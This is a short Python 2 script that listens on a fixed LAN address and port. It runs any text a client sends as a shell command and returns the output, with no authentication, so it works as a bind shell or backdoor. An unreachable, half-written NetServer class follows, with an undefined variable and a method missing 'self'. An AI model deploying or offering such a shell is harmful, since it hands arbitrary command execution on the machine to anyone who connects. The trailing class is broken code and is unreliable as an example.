 #!/usr/bin/python
import socket
import commands
import select

HOST='192.168.0.113'
PORT=50007
s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)
while 1:
	conn,addr=s.accept()
	print'Connected by',addr
	while 1:
		data=conn.recv(1024)
		cmd_status,cmd_result=commands.getstatusoutput(data)
		if len(cmd_result.strip()) ==0:
			conn.sendall('Done.')
		else:
			conn.sendall(cmd_result)
	conn.close()

class NetServer:
	host = "127.0.0.1"
	port = 2048
	ssocket = None

	def __init__(self, host, port):
		self.host = host
		self.port = port

	def initSocket(self):
		self.ssocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.ssocket.bind((self.host, port))
		self.ssocket.listen(5)

	def function():
		pass



		